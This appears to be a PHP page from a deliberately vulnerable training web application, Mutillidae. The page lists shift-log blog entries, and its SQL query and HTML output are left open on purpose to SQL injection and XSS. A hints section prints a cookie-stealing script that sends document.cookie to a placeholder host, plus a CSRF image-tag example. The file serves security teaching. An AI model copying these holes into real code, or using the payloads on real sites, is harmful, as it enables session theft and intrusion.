<center><h2><b>View Shift Logs</b></h2></center><p>

<?php
echo "<form method=\"POST\" action=\"" .$_SERVER['SCRIPT_NAME'] . "?" . $_SERVER['QUERY_STRING'] . "\">";

$query  = "SELECT * FROM accounts";
$result = $mysqli->query($query) or die($mysqli->error . '<p><b>SQL Statement:</b>' . $query);;
//echo $result;
echo '<p>Show only:<select size="1" name="show_only_user">';
echo '<option value="">Choose Operator</option>\n';
echo '<option value="Show All">Show All</option>\n';
while($row = $result->fetch_assoc())
{
    echo '<option value="' . $row['username'] . '">' . $row['username'] . '</option>\n';

}
echo '</select><input type="submit" value="Submit">';

?>
<?php
// Grab inputs
$inputfromform = @$_REQUEST["input_from_form"];
$showonlyuser =  @$_REQUEST["show_only_user"];

if ($showonlyuser  <> "") {
	if ($showonlyuser=="Show All"){
		$showonlyuser = "";
	}
	$query  = "SELECT * FROM blogs_table WHERE
			blogger_name like '{$showonlyuser}%'
			ORDER BY date DESC
			LIMIT 0 , 100";
			
	$result = $mysqli->query($query) or die($mysqli->error . '<p><b>SQL Statement:</b>' . $query);;
	//echo $result;
	echo '<p>Entries:</p>';
	while($row = $result->fetch_assoc())
	{
	echo "<p><b>{$row['blogger_name']}:</b>({$row['date']})<br>{$row['comment']}</p>";
	}
	echo "<p>";
}

//phpinfo();
?>
<?php
// Begin hints section
if (@$_COOKIE["showhints"]==1) {
	echo '<p><div style="background-color: #FFFF00"></p> <p><center><h2><b>HINT - Disable with link on the left</b></h2></center></p>
	<b>For XSS:</b>XSS is easy stuff. This one shows off both reflected (you see the results 
	instantly) and stored (someone can run across it later in another app that
	uses the same database). "&lt;script&gt;alert("XSS");&lt;/script&gt;" is the classic, but 
	there are far more interesting things you could do which I plan show in a video later. 
	For some hot cookie stealing action, try something like:
	<pre>
	&lt;script&gt;
		new Image().src="http://some-ip/dojo-control/catch.php?cookie="+encodeURI(document.cookie);
	&lt;/script&gt;
	</pre>	
	Also, check out <a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheat Sheet</a>
	for more ways you can encode XSS attacks that may allow you to get around some filters.
	<br><br>
	<b>For CSRF:</b>Ok, what you have do is create another page someplace and
	make a link to an image that is not an image. You could use something like 
	the following:
	<br>
	&lt;img src="http://localhost/mutillidae/index.php?page=view-shift-logs.php&input_from_form=hi%20there%20monkeyboy"&gt;
	<br>
	This is the easy way to do CSRF with the GET method. Just login as someone, make 
	your page with the link image someplace else, and then view it. You should now see
	something new on the comment wall. :)
	</div>'; 
}
// End hints section
?>
